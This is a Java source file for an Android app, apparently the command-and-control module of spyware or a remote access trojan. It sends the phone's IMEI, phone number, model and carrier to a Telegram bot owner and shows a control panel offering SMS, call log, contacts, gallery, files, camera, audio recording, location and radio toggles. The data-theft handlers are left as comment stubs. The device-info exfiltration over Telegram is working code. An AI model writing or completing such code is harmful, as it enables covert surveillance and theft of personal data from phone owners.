package com.my.luck.network;

import android.content.Context;
import android.os.Build;
import android.telephony.TelephonyManager;
import android.util.Log;
import org.json.JSONObject;
import java.io.DataOutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class TelegramBot {
    private static final String TAG = "TelegramBot";
    private static final String API_URL = "https://api.telegram.org/bot";
    private String botToken;
    private String ownerId;
    private Context context;

    public TelegramBot(Context context, String botToken, String ownerId) {
        this.context = context;
        this.botToken = botToken;
        this.ownerId = ownerId;
    }

    // ============================================
    // 📤 SEND MESSAGE
    // ============================================

    public void sendMessage(String message) {
        new Thread(() -> {
            try {
                String urlString = API_URL + botToken + "/sendMessage";
                URL url = new URL(urlString);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);

                JSONObject payload = new JSONObject();
                payload.put("chat_id", ownerId);
                payload.put("text", message);
                payload.put("parse_mode", "HTML");

                DataOutputStream out = new DataOutputStream(conn.getOutputStream());
                out.writeBytes(payload.toString());
                out.flush();
                out.close();

                int responseCode = conn.getResponseCode();
                if (responseCode == 200) {
                    Log.d(TAG, "Message sent successfully");
                } else {
                    Log.e(TAG, "Failed to send message: " + responseCode);
                }
                conn.disconnect();
            } catch (Exception e) {
                Log.e(TAG, "Error sending message", e);
            }
        }).start();
    }

    // ============================================
    // 🎮 SEND KEYBOARD (COMMAND BUTTONS)
    // ============================================

    public void sendKeyboard() {
        new Thread(() -> {
            try {
                String urlString = API_URL + botToken + "/sendMessage";
                URL url = new URL(urlString);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);

                JSONObject payload = new JSONObject();
                payload.put("chat_id", ownerId);
                payload.put("text", "🎮 <b>Control Panel</b>\nChoose a command:");

                // Create keyboard buttons
                JSONObject replyKeyboard = new JSONObject();
                JSONArray keyboardArray = new JSONArray();

                // Row 1
                JSONArray row1 = new JSONArray();
                row1.put(new JSONObject().put("text", "📱 SMS"));
                row1.put(new JSONObject().put("text", "📞 Call Log"));
                row1.put(new JSONObject().put("text", "👤 Contacts"));
                keyboardArray.put(row1);

                // Row 2
                JSONArray row2 = new JSONArray();
                row2.put(new JSONObject().put("text", "🖼️ Gallery"));
                row2.put(new JSONObject().put("text", "📂 Files"));
                row2.put(new JSONObject().put("text", "📷 Camera"));
                keyboardArray.put(row2);

                // Row 3
                JSONArray row3 = new JSONArray();
                row3.put(new JSONObject().put("text", "🎤 Record Audio"));
                row3.put(new JSONObject().put("text", "📍 Location"));
                row3.put(new JSONObject().put("text", "ℹ️ Device Info"));
                keyboardArray.put(row3);

                // Row 4
                JSONArray row4 = new JSONArray();
                row4.put(new JSONObject().put("text", "📶 WiFi On"));
                row4.put(new JSONObject().put("text", "📶 WiFi Off"));
                row4.put(new JSONObject().put("text", "💡 Flash On"));
                row4.put(new JSONObject().put("text", "💡 Flash Off"));
                keyboardArray.put(row4);

                // Row 5
                JSONArray row5 = new JSONArray();
                row5.put(new JSONObject().put("text", "🔵 BT On"));
                row5.put(new JSONObject().put("text", "🔵 BT Off"));
                row5.put(new JSONObject().put("text", "✈️ Airplane"));
                keyboardArray.put(row5);

                // Row 6
                JSONArray row6 = new JSONArray();
                row6.put(new JSONObject().put("text", "🗑️ Kill"));
                row6.put(new JSONObject().put("text", "🔄 Refresh"));
                keyboardArray.put(row6);

                replyKeyboard.put("keyboard", keyboardArray);
                replyKeyboard.put("resize_keyboard", true);
                replyKeyboard.put("one_time_keyboard", false);

                payload.put("reply_markup", replyKeyboard);

                DataOutputStream out = new DataOutputStream(conn.getOutputStream());
                out.writeBytes(payload.toString());
                out.flush();
                out.close();

                int responseCode = conn.getResponseCode();
                if (responseCode == 200) {
                    Log.d(TAG, "Keyboard sent successfully");
                } else {
                    Log.e(TAG, "Failed to send keyboard: " + responseCode);
                }
                conn.disconnect();
            } catch (Exception e) {
                Log.e(TAG, "Error sending keyboard", e);
            }
        }).start();
    }

    // ============================================
    // 📱 SEND DEVICE INFO
    // ============================================

    public void sendDeviceInfo() {
        TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        
        String info = "🖥️ <b>Device Connected</b>\n";
        info += "━━━━━━━━━━━━━━━\n";
        info += "📱 <b>Model:</b> " + Build.MODEL + "\n";
        info += "🏷️ <b>Brand:</b> " + Build.BRAND + "\n";
        info += "📡 <b>Android:</b> " + Build.VERSION.RELEASE + "\n";
        info += "🔢 <b>SDK:</b> " + Build.VERSION.SDK_INT + "\n";
        info += "📶 <b>IMEI:</b> " + (tm != null ? tm.getDeviceId() : "N/A") + "\n";
        info += "📞 <b>Number:</b> " + (tm != null ? tm.getLine1Number() : "N/A") + "\n";
        info += "📶 <b>Network:</b> " + (tm != null ? tm.getNetworkOperatorName() : "N/A") + "\n";
        info += "🕐 <b>Time:</b> " + new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.getDefault()).format(new java.util.Date());
        
        sendMessage(info);
        
        // Send keyboard after device info
        try {
            Thread.sleep(1000);
            sendKeyboard();
        } catch (Exception e) {
            Log.e(TAG, "Error sending keyboard", e);
        }
    }

    // ============================================
    // 📦 COMMAND HANDLERS (Called from MainActivity)
    // ============================================

    public void handleCommand(String command) {
        switch (command) {
            case "📱 SMS":
                sendMessage("📱 Fetching SMS...");
                // Call SMS module
                break;
            case "📞 Call Log":
                sendMessage("📞 Fetching Call Log...");
                // Call CallLog module
                break;
            case "👤 Contacts":
                sendMessage("👤 Fetching Contacts...");
                // Call Contacts module
                break;
            case "🖼️ Gallery":
                sendMessage("🖼️ Fetching Gallery...");
                // Call Gallery module
                break;
            case "📂 Files":
                sendMessage("📂 Fetching Files...");
                // Call File module
                break;
            case "📷 Camera":
                sendMessage("📷 Capturing Photo...");
                // Call Camera module
                break;
            case "🎤 Record Audio":
                sendMessage("🎤 Recording Audio...");
                // Call Audio module
                break;
            case "📍 Location":
                sendMessage("📍 Getting Location...");
                // Call Location module
                break;
            case "ℹ️ Device Info":
                sendDeviceInfo();
                break;
            case "📶 WiFi On":
                sendMessage("📶 WiFi turned ON");
                // Call WiFi on
                break;
            case "📶 WiFi Off":
                sendMessage("📶 WiFi turned OFF");
                // Call WiFi off
                break;
            case "💡 Flash On":
                sendMessage("💡 Flash turned ON");
                // Call Flash on
                break;
            case "💡 Flash Off":
                sendMessage("💡 Flash turned OFF");
                // Call Flash off
                break;
            case "🔵 BT On":
                sendMessage("🔵 Bluetooth turned ON");
                // Call Bluetooth on
                break;
            case "🔵 BT Off":
                sendMessage("🔵 Bluetooth turned OFF");
                // Call Bluetooth off
                break;
            case "✈️ Airplane":
                sendMessage("✈️ Airplane mode toggled");
                // Call Airplane mode
                break;
            case "🗑️ Kill":
                sendMessage("🗑️ Kill command received");
                // Kill the app
                break;
            case "🔄 Refresh":
                sendKeyboard();
                break;
            default:
                sendMessage("❌ Unknown command: " + command);
                break;
        }
    }

    // ============================================
    // 📥 GET UPDATES (Polling)
    // ============================================

    public void getUpdates(int offset) {
        new Thread(() -> {
            try {
                String urlString = API_URL + botToken + "/getUpdates?offset=" + offset + "&timeout=30";
                URL url = new URL(urlString);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("GET");
                
                java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(conn.getInputStream()));
                StringBuilder response = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) {
                    response.append(line);
                }
                reader.close();
                
                // Parse response and handle commands
                // This would be implemented in MainActivity
                Log.d(TAG, "Updates received: " + response.toString());
                conn.disconnect();
            } catch (Exception e) {
                Log.e(TAG, "Error getting updates", e);
            }
        }).start();
    }
}
